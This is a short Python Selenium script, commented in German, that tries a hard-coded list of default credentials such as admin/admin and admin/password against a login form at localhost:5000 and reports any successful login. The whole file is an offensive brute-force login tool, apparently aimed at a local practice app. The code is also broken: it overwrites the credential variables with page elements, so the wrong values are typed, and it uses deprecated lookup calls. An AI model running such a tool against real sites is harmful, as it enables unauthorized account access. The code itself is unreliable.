from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time


credentials = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "1234"},
    {"username": "admin", "password": "password123"},
    {"username": "admin", "password": "admin1234"},
    {"username": "admin", "password": "admin12345"},
    {"username": "marvin", "password": "pass123"},
]

def brute_force_login(username, password):
    # Starte den Browser
    driver = webdriver.Chrome()

    # Öffne die Seite
    driver.get("http://localhost:5000/login")

    # Finde das Element mit dem Namen "username"
    username = driver.find_element_by_name("username")

    # Schreibe in das Element
    username.send_keys(username)

    # Finde das Element mit dem Namen "password"
    password = driver.find_element_by_name("password")

    # Schreibe in das Element
    password.send_keys(password)

    # Drücke die Enter-Taste
    password.send_keys(Keys.RETURN)

    login_button = driver.find_element_by_class_name("btn-primary")
    login_button.click()

    time.sleep(5)

    if "Invalid credentials" in driver.page_source:
        print("Invalid credentials")
    else:
        print("Login successful")
    
    # Schließe den Browser
    driver.quit()

for credential in credentials:
    brute_force_login(credential["username"], credential["password"])
